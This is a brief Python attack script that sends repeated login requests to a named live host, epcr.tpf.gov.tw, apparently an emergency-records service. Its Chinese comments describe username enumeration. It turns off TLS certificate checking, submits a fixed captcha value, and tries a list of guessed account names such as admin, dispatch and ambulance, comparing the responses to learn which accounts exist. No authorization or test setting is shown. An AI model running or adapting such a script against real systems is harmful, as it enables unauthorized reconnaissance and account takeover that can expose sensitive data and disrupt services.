import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(u,p):
    body=json.dumps({"username":u,"password":p,"captcha":"1","domain":"AUTH_SERVER"}).encode()
    req=urllib.request.Request(BASE+"/login",data=body,method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 用户枚举: 测试不存在的 vs 可能存在的用户名, 看响应差异
print("=== 用户名存在性枚举 (密码统一 x) ===")
usernames=["admin","root","test","user","epcr","tpf","port","dispatch","operator","123456","admin123","tpf01","operator1","system","guest","demo","emergency","ambulance","911","119","tpfadmin","portadmin"]
prev=None
for u in usernames:
    code,b=post_login(u,"x")
    # 关键: 看是否 captcha 错误(可能先验captcha) 还是 401
    mark=""
    print(f"  [{u:14s}] -> {code} | {b[:70]}")
    time.sleep(0.1)
print("DONE")
